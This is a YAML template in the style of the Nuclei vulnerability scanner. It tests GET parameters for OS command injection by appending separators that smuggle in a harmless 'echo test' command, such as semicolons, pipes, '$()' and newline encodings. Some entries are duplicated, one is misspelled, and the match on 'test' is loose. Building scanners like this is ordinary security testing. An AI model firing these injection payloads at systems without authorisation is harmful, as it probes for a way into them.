id: mr12-osInjectionGet
info:
  name: os InjectionGet Detection for GET parameters
  description: Template to check for os command Injection vulnerabilities in GET  Url must be https://target.com/site={we will put local host here}
  severity: high
  author: mr12
  tags:
    - osInjection
requests:
  - method: GET
    path:
      - "{{BaseURL}}{{osPayloads}}"
    payloads:
      osPayloads:
        - ";echo test"
        - ";echo test #"
        - ";echo test ;"
        - "& echo test #"
        - "& echo test &"
        - "| echo test"
        - "# echo test"
        - "| echo test"
        - "$(echo test)"
        - "|| echo test"
        - "| echo test |"
        - "|| echo test ||"
        - ";echo test;"
        - "` ehoc test `"
        - "%0a echo test %0a "
        - ";echo test|"
        - ";|/usr/bin/echo test|"
        - "\n/bin/echo test \n"
        - ;system('echo test')
        - ;system('echo test')
        - ;system('echo test')
        - eval('echo test')
        - eval('echo test');
        - response.write test
        - :response.write test

    matchers-condition: or
    matchers:
      - type: word
        part: body
        condition: or
        words:
          - "test"
      
